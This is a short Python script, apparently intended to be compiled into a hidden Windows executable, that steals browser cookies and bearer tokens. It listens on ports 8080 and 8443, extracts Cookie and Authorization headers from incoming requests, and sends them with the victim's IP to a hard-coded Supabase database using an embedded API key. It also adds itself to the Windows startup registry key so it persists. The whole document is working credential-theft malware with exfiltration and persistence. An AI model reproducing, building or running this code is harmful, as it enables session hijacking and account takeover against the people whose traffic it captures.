# Save as ynubsec.py → pyinstaller --onefile --noconsole ynubsec.py
import socket,threading,re,urllib.request,json,psutil,time,winreg,ctypes
from multiprocessing import Process

SUPABASE_URL="https://bljzczucifemikxrvkkm.supabase.co/rest/v1/cookies"
SUPABASE_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJsanpjenVjaWZlbWlreHJ2a2ttIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5MjIxODAsImV4cCI6MjA4OTQ5ODE4MH0.R_sPF74xdjLz-n13WUlqZbqDbKY03Yveegea_MzZHT4"

def send(data):
    req=urllib.request.Request(SUPABASE_URL,json.dumps(data).encode(),'POST')
    req.add_header('apikey',SUPABASE_KEY);req.add_header('Authorization',f'Bearer {SUPABASE_KEY}')
    req.add_header('Content-Type','application/json')
    try:urllib.request.urlopen(req,timeout=3)
    except:pass

def proxy(p):
    s=socket.socket();s.bind(('0.0.0.0',p));s.listen(50)
    while 1:
        c,a=s.accept();d=c.recv(8192).decode(errors='ignore')
        ck=re.findall(r'Cookie:\s*([^\r\n]*)',d,re.I)
        tk=re.findall(r'Authorization:\s*Bearer\s*([^\s\r\n]*)',d,re.I)
        if ck or tk: send({'cookies':ck[0]if ck else'','tokens':tk[0]if tk else'','src_ip':str(a[0]),'ua':'Windows','timestamp':str(time.time())})
        c.send(b'HTTP/1.1 200 OK\r\n\r\n');c.close()

if __name__=='__main__':
    # Auto-run on startup
    key=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Run',0,winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key,0,'REG_SZ',r'%s\ynubsec.exe'%__file__.rsplit('\\',1)[0])
    winreg.CloseKey(key)
    
    Process(target=proxy,args=(8080,)).start()
    Process(target=proxy,args=(8443,)).start()
    input('🍪 Ynubsec running... Press Enter to stop')